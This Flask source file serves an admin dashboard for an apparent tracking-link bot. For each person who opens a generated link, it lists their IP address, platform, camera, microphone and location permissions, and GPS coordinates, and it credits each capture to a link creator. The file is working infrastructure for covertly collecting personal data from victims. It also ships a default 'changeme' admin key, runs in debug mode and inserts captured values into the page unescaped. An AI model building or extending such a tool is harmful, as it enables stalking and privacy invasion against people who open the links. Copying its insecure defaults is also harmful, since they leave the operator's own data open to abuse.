import os
import json
from flask import Flask, jsonify, request, abort
from datetime import datetime

app = Flask(__name__)

DATA_DIR = '/tmp/bot_data'
ADMIN_IDS = [int(x.strip()) for x in os.environ.get('ADMIN_IDS', '').split(',') if x.strip()]

def check_admin(request):
    """Simple API key check for admin endpoints"""
    api_key = request.headers.get('X-Admin-Key')
    if api_key != os.environ.get('ADMIN_API_KEY', 'changeme'):
        abort(401)

@app.route('/', methods=['GET'])
def admin_dashboard():
    """Simple web admin dashboard"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Bot Admin Dashboard</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #0f0f23; color: #e0e0e0; padding: 20px;
            }
            .container { max-width: 1200px; margin: 0 auto; }
            h1 { color: #00ff88; margin-bottom: 30px; border-bottom: 2px solid #00ff88; padding-bottom: 10px; }
            .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
            .stat-card {
                background: #1a1a3e; border-radius: 10px; padding: 20px; text-align: center;
                border: 1px solid #2a2a5e;
            }
            .stat-card .number { font-size: 36px; font-weight: bold; color: #00ff88; }
            .stat-card .label { font-size: 14px; color: #888; margin-top: 5px; }
            table { width: 100%; border-collapse: collapse; background: #1a1a3e; border-radius: 10px; overflow: hidden; }
            th { background: #2a2a5e; padding: 12px; text-align: left; color: #00ff88; }
            td { padding: 12px; border-bottom: 1px solid #2a2a5e; }
            .badge { 
                display: inline-block; padding: 3px 8px; border-radius: 5px; font-size: 12px;
            }
            .badge-green { background: #003300; color: #00ff00; }
            .badge-red { background: #330000; color: #ff0000; }
            .refresh { 
                background: #00ff88; color: #0f0f23; border: none; padding: 10px 20px;
                border-radius: 5px; cursor: pointer; font-weight: bold; margin-bottom: 20px;
            }
            .refresh:hover { background: #00cc6a; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔐 Admin Dashboard</h1>
            <button class="refresh" onclick="location.reload()">🔄 Refresh Data</button>
            <div class="stats" id="stats">Loading...</div>
            <h2 style="margin-bottom:15px;">📋 Captures Log</h2>
            <table id="captures">
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>IP</th>
                        <th>Platform</th>
                        <th>Camera</th>
                        <th>Mic</th>
                        <th>Location</th>
                        <th>Coordinates</th>
                    </tr>
                </thead>
                <tbody id="capturesBody">
                    <tr><td colspan="7">Loading...</td></tr>
                </tbody>
            </table>
        </div>
        <script>
            async function loadData() {
                try {
                    const adminKey = localStorage.getItem('admin_key') || prompt('Enter admin API key:');
                    if (adminKey) localStorage.setItem('admin_key', adminKey);
                    
                    const res = await fetch('/admin/data', {
                        headers: { 'X-Admin-Key': adminKey }
                    });
                    const data = await res.json();
                    
                    // Stats
                    document.getElementById('stats').innerHTML = `
                        <div class="stat-card">
                            <div class="number">${data.total_links}</div>
                            <div class="label">Total Links</div>
                        </div>
                        <div class="stat-card">
                            <div class="number">${data.total_captures}</div>
                            <div class="label">Total Captures</div>
                        </div>
                        <div class="stat-card">
                            <div class="number">${data.recent_24h}</div>
                            <div class="label">Last 24 Hours</div>
                        </div>
                    `;
                    
                    // Captures table
                    let html = '';
                    data.captures.forEach(c => {
                        const hasLoc = c.latitude && c.longitude;
                        html += `<tr>
                            <td>${c.timestamp ? c.timestamp.substring(0,19) : 'N/A'}</td>
                            <td>${c.ip || 'Unknown'}</td>
                            <td>${c.platform || 'Unknown'}</td>
                            <td><span class="badge ${c.hasCamera ? 'badge-green' : 'badge-red'}">${c.hasCamera ? '✅' : '❌'}</span></td>
                            <td><span class="badge ${c.hasMic ? 'badge-green' : 'badge-red'}">${c.hasMic ? '✅' : '❌'}</span></td>
                            <td><span class="badge ${c.hasLocation ? 'badge-green' : 'badge-red'}">${c.hasLocation ? '✅' : '❌'}</span></td>
                            <td>${hasLoc ? `${c.latitude}, ${c.longitude}` : 'N/A'}</td>
                        </tr>`;
                    });
                    document.getElementById('capturesBody').innerHTML = html || '<tr><td colspan="7">No captures yet</td></tr>';
                    
                } catch(e) {
                    document.getElementById('stats').innerHTML = '<div class="stat-card">Error loading data</div>';
                }
            }
            loadData();
        </script>
    </body>
    </html>
    """, 200

@app.route('/data', methods=['GET'])
def admin_data():
    """JSON API for admin data"""
    check_admin(request)
    
    links_file = os.path.join(DATA_DIR, 'links.json')
    links = {}
    if os.path.exists(links_file):
        with open(links_file, 'r') as f:
            links = json.load(f)
    
    all_captures = []
    for lid, ldata in links.items():
        for cap in ldata.get('captures', []):
            cap['link_id'] = lid
            cap['creator'] = ldata.get('creator_name', 'Unknown')
            all_captures.append(cap)
    
    # Reverse chronological
    all_captures.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
    
    # Count recent 24h
    from datetime import datetime, timedelta
    cutoff = (datetime.now() - timedelta(hours=24)).isoformat()
    recent = sum(1 for c in all_captures if c.get('timestamp', '') >= cutoff)
    
    return jsonify({
        'total_links': len(links),
        'total_captures': len(all_captures),
        'recent_24h': recent,
        'captures': all_captures[:50]  # Last 50
    })

if __name__ == '__main__':
    app.run(debug=True, port=5000)
